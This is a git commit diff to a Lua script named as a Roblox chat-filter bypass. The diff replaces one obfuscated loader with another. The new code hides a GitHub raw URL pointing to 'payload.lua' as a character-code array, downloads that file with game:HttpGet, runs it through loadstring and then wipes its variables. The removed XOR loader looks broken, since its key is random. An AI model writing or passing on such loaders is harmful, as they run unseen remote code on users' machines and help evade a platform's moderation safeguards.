144c6463f0839291c2ff1030d89d7177e8cf59ea
Goku55050 <ps1650134@gmail.com>
2025-12-23 17:20:52 +0530

    Update areschatbypass.lua

--- areschatbypass.lua
+++ areschatbypass.lua
@@ -1,53 +1,24 @@
-local _c=string.char
-local _x=bit32.bxor
-local _t=table.concat
-local _l=loadstring
-local _r=math.random
+local a=string.char
+local b=table.concat
+local c=game.HttpGet
+local d=loadstring
 
-local _s=((os.clock()*1000)%251)+5
-
---e
-do
-  local _n=0
-  for i=1,10 do _n=_n+i*_r(1,9) end
-end
-
---f
-local _A={
-  96,33,56,56,50,51,61,57,50,57,50,50,61,50,61,56,51,61,50,57,
-  56,51,61,50,50,57,61,56,51,61,50,57,50,61,56,51,61,50,57,56,
-  51,61,50,50,57,61,56,51,61,50,57,50,61,56,51,61,50,57,56
+local e={
+104,116,116,112,115,58,47,47,114,97,119,46,103,105,116,104,117,98,
+117,115,101,114,99,111,110,116,101,110,116,46,99,111,109,47,71,111,
+107,117,53,53,48,53,48,47,65,114,101,115,45,114,111,98,108,111,120,
+47,114,101,102,115,47,104,101,97,100,115,47,109,97,105,110,47,112,
+97,121,108,111,97,100,46,108,117,97
 }
 
--- g
-local function _d(b,k)
-  local o={}
-  for i=1,#b do
-    o[i]=_c(_x(b[i],k))
-  end
-  return _t(o)
+local f={}
+for i=1,#e do
+    f[i]=a(e[i])
 end
 
---h
-local _L1=_d(_A,_s)
+local g=b(f)
+local h=d(c(game,g))
+if h then h() end
 
---i
-local _B={}
-for i=#_L1,1,-1 do
-  _B[#_B+1]=_c(_L1:byte(i)-1)
-end
-local _SRC=_t(_B)
-
---j
-local _F=_l(_SRC)
-if _F then
-  _F()
-end
-
---k
-_A=nil
-_B=nil
-_L1=nil
-_SRC=nil
-_d=nil
+f=nil e=nil g=nil
 collectgarbage("collect")
